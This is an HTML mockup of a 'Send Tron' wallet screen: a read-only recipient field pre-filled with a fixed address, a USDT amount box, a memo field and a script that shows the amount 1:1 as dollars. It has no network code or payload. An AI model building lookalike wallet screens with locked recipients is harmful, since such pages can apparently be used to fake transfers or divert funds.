<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Tron</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

  <label>Address or Domain Name</label>
  <div class="input-box">
    <input value="TKDxyv1d1krLSfynn3jQrY" readonly>
    <div class="actions">
      <span class="accent">Paste</span>
      <svg viewBox="0 0 24 24">
        <circle cx="12" cy="7" r="4"/>
        <path d="M5.5 21a6.5 6.5 0 0 1 13 0"/>
      </svg>
      <svg viewBox="0 0 24 24">
        <path d="M4 7V4h3"/>
        <path d="M17 4h3v3"/>
        <path d="M20 17v3h-3"/>
        <path d="M7 20H4v-3"/>
      </svg>
    </div>
  </div>

  <label class="mt">Amount</label>
  <div class="input-box">
    <input id="amount" placeholder="Amount" inputmode="decimal">
    <span class="unit">USDT</span>
    <span class="accent">Max</span>
  </div>

  <div class="value">= $<span id="usd">0.00</span></div>

  <label class="mt">Memo</label>
  <div class="input-box">
    <input>
    <div class="actions">
      <svg viewBox="0 0 24 24">
        <path d="M4 7V4h3"/>
        <path d="M17 4h3v3"/>
        <path d="M20 17v3h-3"/>
        <path d="M7 20H4v-3"/>
      </svg>
      <svg viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10"/>
        <line x1="12" y1="8" x2="12" y2="12"/>
        <circle cx="12" cy="16" r="1"/>
      </svg>
    </div>
  </div>

</div>

<button class="next">Next</button>

<script>
const amount = document.getElementById("amount");
const usd = document.getElementById("usd");

amount.addEventListener("input", () => {
  const v = parseFloat(amount.value);
  usd.textContent = !isNaN(v) ? v.toFixed(2) : "0.00";
});
</script>

</body>
</html>
